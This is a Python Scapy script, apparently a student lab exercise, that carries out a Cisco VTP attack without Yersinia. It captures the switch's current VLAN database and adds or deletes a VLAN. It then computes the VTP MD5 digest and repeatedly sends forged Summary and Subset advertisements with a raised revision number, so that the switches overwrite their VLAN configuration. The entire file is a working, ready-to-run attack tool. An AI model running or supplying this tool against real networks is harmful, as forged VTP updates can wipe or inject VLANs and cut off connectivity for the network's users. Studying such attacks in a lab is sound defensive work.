#!/usr/bin/env python3
# vtp_attack_scratch.py
# Nombre: Sael German Garcia | Matrícula: 2025-0725
# Objetivo: VTP Attack desde cero con Scapy, sin Yersinia y sin replay PCAP.

import sys
import time
import struct
import socket
import hashlib

from scapy.layers.l2 import Dot3, LLC, SNAP
from scapy.packet import Raw
from scapy.sendrecv import sendp, sniff
from scapy.arch import get_if_hwaddr


IFACE = "ens3"
DOMAIN = "LAB"
DST_MAC = "01:00:0c:cc:cc:cc"
UPDATER_IP = "10.13.58.1"

DEFAULT_ADD_VLAN = 999
DEFAULT_ADD_NAME = "HACKIADO"
DEFAULT_DELETE_VLAN = 20


def mac_bytes_to_str(mac_bytes):
    return ":".join(f"{b:02x}" for b in mac_bytes)


def domain_padded(domain):
    d = domain.encode("ascii")
    return d.ljust(32, b"\x00")


def is_vtp_packet(raw_bytes):
    """
    VTP en este lab viene como:
    802.3 + LLC + SNAP
    LLC: aa aa 03
    SNAP OUI Cisco: 00 00 0c
    SNAP PID VTP: 20 03
    """
    if len(raw_bytes) < 22:
        return False

    if raw_bytes[14:17] != b"\xaa\xaa\x03":
        return False

    if raw_bytes[17:20] != b"\x00\x00\x0c":
        return False

    if raw_bytes[20:22] != b"\x20\x03":
        return False

    return True


def parse_vtp(raw_bytes):
    """
    Devuelve los campos importantes del paquete VTP.
    VTP empieza después de:
    Dot3 14 bytes + LLC 3 bytes + SNAP 5 bytes = offset 22
    """
    vtp = raw_bytes[22:]

    if len(vtp) < 40:
        return None

    version = vtp[0]
    code = vtp[1]
    third = vtp[2]
    dom_len = vtp[3]
    domain = vtp[4:4 + dom_len].decode("ascii", errors="ignore")
    revision = struct.unpack(">I", vtp[36:40])[0]

    info = {
        "version": version,
        "code": code,
        "third": third,
        "domain": domain,
        "dom_len": dom_len,
        "revision": revision,
        "raw_vtp": vtp,
    }

    if code == 2:
        info["vlan_db"] = vtp[40:]

    return info


def send_vtp_request():
    """
    Solicita al switch que envíe Summary + Subset Advertisement.
    Esto ayuda si no estamos recibiendo Subset automáticamente.
    """
    src_mac = get_if_hwaddr(IFACE)
    d = DOMAIN.encode("ascii")

    payload = b""
    payload += struct.pack(">B", 1)          # VTP version 1
    payload += struct.pack(">B", 3)          # Code 3 = Advertisement Request
    payload += struct.pack(">B", 0)          # Reserved
    payload += struct.pack(">B", len(d))     # Domain length
    payload += domain_padded(DOMAIN)         # Domain padded
    payload += struct.pack(">H", 1)          # Start value

    pkt = (
        Dot3(dst=DST_MAC, src=src_mac) /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
        SNAP(OUI=0x00000c, code=0x2003) /
        Raw(load=payload)
    )

    sendp(pkt, iface=IFACE, verbose=False)


def capture_current_vtp_db():
    """
    Captura un VTP Subset Advertisement real para aprender la base VLAN actual.
    """
    my_mac = get_if_hwaddr(IFACE).lower()

    print("[*] Buscando VTP Subset Advertisement actual...")
    print("[*] Si tarda, el script enviará un VTP Request automáticamente.")

    def capture_once(timeout_value):
        packets = sniff(
            iface=IFACE,
            timeout=timeout_value,
            store=True,
            filter="ether dst 01:00:0c:cc:cc:cc"
        )

        for pkt in packets:
            raw_bytes = bytes(pkt)

            if not is_vtp_packet(raw_bytes):
                continue

            src_mac = mac_bytes_to_str(raw_bytes[6:12]).lower()

            # Ignorar nuestros propios paquetes
            if src_mac == my_mac:
                continue

            info = parse_vtp(raw_bytes)

            if not info:
                continue

            if info["domain"] != DOMAIN:
                continue

            # Code 2 = Subset Advertisement
            if info["code"] == 2:
                print(f"[+] Subset capturado desde {src_mac}")
                print(f"[+] Dominio: {info['domain']}")
                print(f"[+] Version: {info['version']}")
                print(f"[+] Revision actual: {info['revision']}")
                print(f"[+] Tamaño VLAN DB: {len(info['vlan_db'])} bytes")
                return info

        return None

    info = capture_once(8)

    if info:
        return info

    print("[*] No se capturó Subset. Enviando VTP Request...")
    send_vtp_request()

    info = capture_once(10)

    if not info:
        print("[!] No se pudo capturar la base VTP.")
        print("[!] Verifica trunk, dominio LAB, VTP version 1 y que el puerto ens3 esté conectado a SW1.")
        sys.exit(1)

    return info


def parse_vlan_entries(vlan_db):
    """
    Divide la base VLAN en entradas individuales.
    Cada entrada comienza con un byte de longitud.
    """
    entries = []
    pos = 0

    while pos < len(vlan_db):
        entry_len = vlan_db[pos]

        if entry_len < 12:
            break

        if pos + entry_len > len(vlan_db):
            break

        entry = vlan_db[pos:pos + entry_len]
        vlan_id = struct.unpack(">H", entry[4:6])[0]
        entries.append((vlan_id, entry))
        pos += entry_len

    return entries


def build_vlan_entry(vlan_id, vlan_name):
    """
    Construye una entrada VLAN Ethernet.
    Formato:
    length, status, type, name_len, vlan_id, mtu, dot10index, name_padded
    """
    name = vlan_name.encode("ascii")
    name_len = len(name)
    pad_len = (4 - (name_len % 4)) % 4
    name_padded = name + (b"\x00" * pad_len)

    entry_len = 12 + len(name_padded)
    dot10index = 0x100000 + vlan_id

    entry = b""
    entry += struct.pack(">B", entry_len)      # Entry length
    entry += struct.pack(">B", 0x00)           # Status active
    entry += struct.pack(">B", 0x01)           # Type Ethernet
    entry += struct.pack(">B", name_len)       # VLAN name length
    entry += struct.pack(">H", vlan_id)        # VLAN ID
    entry += struct.pack(">H", 1500)           # MTU
    entry += struct.pack(">I", dot10index)     # 802.10 SAID / dot10
    entry += name_padded

    return entry


def add_vlan_to_db(vlan_db, vlan_id, vlan_name):
    entries = parse_vlan_entries(vlan_db)

    for existing_vlan, _ in entries:
        if existing_vlan == vlan_id:
            print(f"[!] La VLAN {vlan_id} ya existe en la base VTP.")
            return vlan_db

    new_entry = build_vlan_entry(vlan_id, vlan_name)

    result = b""
    inserted = False

    for existing_vlan, entry in entries:
        if not inserted and vlan_id < existing_vlan:
            result += new_entry
            inserted = True
        result += entry

    if not inserted:
        result += new_entry

    print(f"[+] VLAN agregada en memoria: {vlan_id} {vlan_name}")
    return result


def delete_vlan_from_db(vlan_db, vlan_id):
    entries = parse_vlan_entries(vlan_db)

    result = b""
    deleted = False

    for existing_vlan, entry in entries:
        if existing_vlan == vlan_id:
            deleted = True
            continue
        result += entry

    if deleted:
        print(f"[+] VLAN eliminada en memoria: {vlan_id}")
    else:
        print(f"[!] VLAN {vlan_id} no encontrada en la base VTP.")

    return result


def calculate_vtp_md5(version, revision, domain, updater_ip, vlan_db):
    """
    Algoritmo basado en la lógica de vtp_generate_md5 de Yersinia:
    MD5(16 bytes cero + Summary Advertisement sin digest + VLAN DB + 16 bytes cero)
    En este laboratorio no se usa password VTP.
    """
    d = domain.encode("ascii")

    summary = bytearray(72)
    summary[0] = version           # VTP version
    summary[1] = 0x01              # Summary Advertisement
    summary[2] = 0x00              # Followers queda en cero para el cálculo MD5
    summary[3] = len(d)            # Domain length
    summary[4:4 + len(d)] = d      # Domain
    summary[36:40] = struct.pack(">I", revision)
    summary[40:44] = socket.inet_aton(updater_ip)
    # Timestamp y MD5 quedan en cero para el cálculo

    md5_data = b"\x00" * 16 + bytes(summary) + vlan_db + b"\x00" * 16
    return hashlib.md5(md5_data).digest()


def build_summary(version, revision, domain, updater_ip, md5_digest):
    d = domain.encode("ascii")

    payload = b""
    payload += struct.pack(">B", version)          # Version
    payload += struct.pack(">B", 0x01)             # Summary Advertisement
    payload += struct.pack(">B", 0x01)             # Followers = hay subset
    payload += struct.pack(">B", len(d))           # Domain length
    payload += domain_padded(domain)               # Domain padded
    payload += struct.pack(">I", revision)         # Revision
    payload += socket.inet_aton(updater_ip)        # Updater
    payload += b"\x00" * 12                        # Timestamp
    payload += md5_digest                          # MD5 digest

    return payload


def build_subset(version, revision, domain, vlan_db):
    d = domain.encode("ascii")

    payload = b""
    payload += struct.pack(">B", version)          # Version
    payload += struct.pack(">B", 0x02)             # Subset Advertisement
    payload += struct.pack(">B", 0x01)             # Sequence number
    payload += struct.pack(">B", len(d))           # Domain length
    payload += domain_padded(domain)               # Domain padded
    payload += struct.pack(">I", revision)         # Revision
    payload += vlan_db                             # VLAN database

    return payload


def send_vtp_update(version, revision, domain, vlan_db):
    src_mac = get_if_hwaddr(IFACE)

    md5_digest = calculate_vtp_md5(
        version=version,
        revision=revision,
        domain=domain,
        updater_ip=UPDATER_IP,
        vlan_db=vlan_db
    )

    print(f"[+] MD5 calculado: {md5_digest.hex().upper()}")

    summary_payload = build_summary(
        version=version,
        revision=revision,
        domain=domain,
        updater_ip=UPDATER_IP,
        md5_digest=md5_digest
    )

    subset_payload = build_subset(
        version=version,
        revision=revision,
        domain=domain,
        vlan_db=vlan_db
    )

    base = (
        Dot3(dst=DST_MAC, src=src_mac) /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
        SNAP(OUI=0x00000c, code=0x2003)
    )

    summary = base / Raw(load=summary_payload)
    subset = base / Raw(load=subset_payload)

    print("[+] Enviando Summary + Subset Advertisement...")

    for _ in range(10):
        sendp(summary, iface=IFACE, verbose=False)
        time.sleep(0.15)
        sendp(subset, iface=IFACE, verbose=False)
        time.sleep(0.25)

    print("[+] Paquetes enviados.")


def main():
    if len(sys.argv) < 2:
        print("Uso:")
        print("  sudo python3 vtp_attack_scratch.py add [vlan_id] [vlan_name]")
        print("  sudo python3 vtp_attack_scratch.py delete [vlan_id]")
        sys.exit(1)

    action = sys.argv[1].lower()

    current = capture_current_vtp_db()

    version = current["version"]
    current_revision = current["revision"]
    new_revision = current_revision + 1
    vlan_db = current["vlan_db"]

    print(f"[+] Revision nueva a enviar: {new_revision}")

    if action == "add":
        vlan_id = int(sys.argv[2]) if len(sys.argv) >= 3 else DEFAULT_ADD_VLAN
        vlan_name = sys.argv[3] if len(sys.argv) >= 4 else DEFAULT_ADD_NAME
        new_vlan_db = add_vlan_to_db(vlan_db, vlan_id, vlan_name)

    elif action == "delete":
        vlan_id = int(sys.argv[2]) if len(sys.argv) >= 3 else DEFAULT_DELETE_VLAN
        new_vlan_db = delete_vlan_from_db(vlan_db, vlan_id)

    else:
        print("[!] Acción inválida. Usa add o delete.")
        sys.exit(1)

    send_vtp_update(
        version=version,
        revision=new_revision,
        domain=DOMAIN,
        vlan_db=new_vlan_db
    )

    print("[+] Verifica en SW1/SW2:")
    print("    show vlan brief | include 10|20|666")
    print("    show vtp status")


if __name__ == "__main__":
    main()
